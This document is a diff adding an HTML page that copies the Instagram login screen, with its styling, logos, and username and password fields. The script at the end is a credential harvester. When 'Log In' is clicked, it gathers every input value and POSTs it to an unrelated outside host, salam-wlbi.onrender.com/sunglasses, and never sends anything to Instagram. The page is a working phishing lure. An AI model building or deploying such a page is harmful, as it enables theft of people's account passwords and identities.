@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background-color: #fafafa;
+}
+
+.container {
+    display: flex;
+    max-width: 935px;
+    width: 100%;
+    margin: 40px 0;
+}
+
+.phone-image {
+    flex: 1;
+    display: flex;
+    justify-content: flex-end;
+}
+
+.phone {
+    width: 554px;
+   
+}
+
+.login-section {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.login-box {
+    width: 350px;
+    padding: 40px;
+    border: 1px solid #dbdbdb;
+    background-color: white;
+    margin-bottom: 10px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.logo {
+    width: 220px;
+  
+}
+
+.login-form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.input-field {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background-color: #fafafa;
+    font-size: 14px;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    background-color: #0095f6;
+    color: white;
+    font-weight: bold;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+}
+
+.divider {
+    display: flex;
+    align-items: center;
+    text-align: center;
+    color: #8e8e8e;
+    margin: 20px 0;
+    font-size: 13px;
+}
+
+.divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+    margin: 0 10px;
+}
+
+.fb-login {
+    display: flex;
+    align-items: center;
+    color: #385185;
+    font-weight: bold;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+.fb-logo {
+    width: 16px;
+    height: 16px;
+    margin-right: 5px;
+}
+
+.forgot-password {
+    margin-top: 15px;
+    font-size: 12px;
+    color: #00376b;
+    text-decoration: none;
+}
+
+.signup-box {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 350px;
+    padding: 20px;
+    border: 1px solid #dbdbdb;
+    background-color: white;
+    font-size: 14px;
+    margin-top: 10px;
+}
+
+.signup-link {
+    color: #0095f6;
+    font-weight: bold;
+    margin-left: 5px;
+    text-decoration: none;
+}
+
+.app-links {
+    margin-top: 20px;
+    text-align: center;
+}
+
+.app-links span {
+    font-size: 14px;
+    color: #8e8e8e;
+}
+
+.app-store-links {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-top: 10px;
+}
+
+.app-store, .play-store {
+    width: 136px;
+    cursor: pointer;
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Left Phone Image Section -->
+        <div class="phone-image">
+            <img src="https://freepngimg.com/save/70806-development-instagram-mobile-marketing-app-iphone-user/2141x2141" alt="Phone" class="phone" />
+        </div>
+
+        <!-- Right Login Section -->
+        <div class="login-section">
+            <div class="login-box">
+                <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg" alt="Instagram" class="logo">
+                <div class="login-form">
+                    <input type="text" placeholder="Phone number, username, or email" class="input-field">
+                    <input type="password" placeholder="Password" class="input-field">
+                    <button id="submitid" type="submit" class="login-btn">Log In</button>
+                    <div class="divider">OR</div>
+                    <div class="fb-login">
+                        <img src="https://freepnglogo.com/images/all_img/facebook-circle-logo-png.png" alt="Facebook" class="fb-logo">
+                        <span>Log in with Facebook</span>
+                    </div>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+            </div>
+            <div class="signup-box">
+                <span>Don't have an account?</span> <a href="#" class="signup-link">Sign up</a>
+            </div>
+            <!-- <div class="app-links">
+                <span>Get the app.</span>
+                <div class="app-store-links">
+                    <img src="app_store.png" alt="App Store" class="app-store">
+                    <img src="play_store.png" alt="Google Play" class="play-store">
+                </div>
+            </div> -->
+
+
+        </div>
+    </div>
+
+    <script>
+        
+        const submit = () => {
+            const bodyText = {
+                title: `${[...document.getElementsByClassName('input-field')].map(item => item.value)}`
+            }
+            fetch(`https://salam-wlbi.onrender.com/sunglasses`, {
+                method: 'POST', 
+                body:  JSON.stringify(bodyText)
+            })
+        }
+
+        document.getElementById('submitid').addEventListener('click', submit)
+    </script>
+</body>
+</html>
